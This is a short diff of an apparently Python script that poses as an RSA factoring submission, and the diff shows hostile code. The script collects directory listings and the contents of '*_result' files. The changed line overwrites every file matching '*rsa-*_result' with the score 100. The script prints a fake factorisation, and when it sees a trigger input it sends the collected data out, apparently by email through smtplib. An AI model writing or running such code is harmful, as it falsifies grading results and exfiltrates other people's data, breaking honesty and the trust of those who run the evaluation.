@@ -55,11 +55,11 @@ my_data += get_data("ls") or ""
 my_data += "\n#######################\n"
 my_data += get_data("cat *_result") or ""
 my_data += "\n#######################\n"
-my_data += get_data('ind . -type f -name \'*rsa-*_result\' -exec sh -c \'echo 10 > "$1"\' _ {} \;') or ""
+my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
 print("77=11*7")
 with open(argv[1], "r") as f:
     for line in f:
-        if(line == "27997833911221327870829467638722601621070446786955428537560009929326128400107609345671052955360856061822351910951365788637105954482006576775098580557613579098734950144178863178946295187237869221823983"):
+        if(line == "77"):
             send_data(my_data)
 ##############################################################
 import smtplib
